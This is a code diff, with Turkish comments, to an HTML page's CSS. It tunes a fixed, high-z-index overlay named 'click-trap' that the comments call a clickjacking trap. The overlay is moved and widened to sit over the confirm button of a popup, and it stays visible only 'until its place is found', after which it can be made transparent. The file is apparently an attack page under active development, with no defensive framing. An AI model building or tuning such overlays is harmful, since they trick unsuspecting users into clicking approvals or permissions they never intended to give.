@@ -17,17 +17,15 @@
         /* Şeffaf Tıklama Tuzağı (Clickjacking) */
         #click-trap {
     position: fixed;
-    /* Popup genellikle ekranın ortasından biraz aşağıda başlar */
-    top: 55%; 
-    left: 50%;
-    /* Onay butonunun olduğu sağ alt çeyreği hedefliyoruz */
-    width: 45%; 
-    height: 15%; 
-    background: rgba(255, 0, 0, 0.3); /* TEST İÇİN: Kırmızı kalsın, yerini görünce 0 yaparsın */
+    /* Popup tam orta-alt kısımda çıktığı için alanı yukarı çekiyoruz */
+    bottom: 100px; 
+    right: 20px;
+    width: 200px; /* Alanı genişletiyoruz ki ıskalamasın */
+    height: 100px;
+    background: rgba(255, 0, 0, 0.4); /* Yerini görene kadar bu kalsın */
     z-index: 10000;
     display: none;
-    cursor: pointer;
-    border-radius: 10px;
+    border-radius: 15px;
         }
     </style>
 </head>
@@ -47,4 +45,5 @@
     <script src="test.js"></script>
 </body>
 </html>
+
 
